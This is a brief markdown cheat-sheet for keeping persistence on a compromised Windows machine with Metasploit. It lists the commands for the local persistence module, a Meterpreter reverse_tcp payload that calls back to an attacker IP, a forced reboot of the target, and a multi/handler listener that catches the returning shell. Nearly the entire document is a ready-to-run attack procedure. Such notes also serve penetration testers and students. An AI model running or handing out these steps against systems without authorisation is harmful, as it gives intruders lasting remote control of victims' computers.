# Metasploit Windows Persistence

__Steps:__
* send meterpreter session to background (`ctrl+z`)
* use and configure `exploit/windows/local/persistence`
  ```shell
  use exploit/windows/local/persistence
  set session <session ID>
  set payload windows/meterpreter/reverse_tcp
  set LHOST 192.168.99.100
  set DisablePayloadHandler false
  run
  ```
* switch back to the meterpreter session with `sessions -i <session ID>`
* open a window shell with `shell` and (force) reboot the system `shutdown /r /f`; quit session
* load and configure a listener and run
  ```shell
  use exploit/multi/handler
  set LHOST 192.168.99.100
  set payload windows/meterpreter/reverse_tcp
  run -j
  ```

__Notes__
* Another option is `Metsvc`
* see all sessions with `sessions -l`
* see all jobs with `jobs -l`

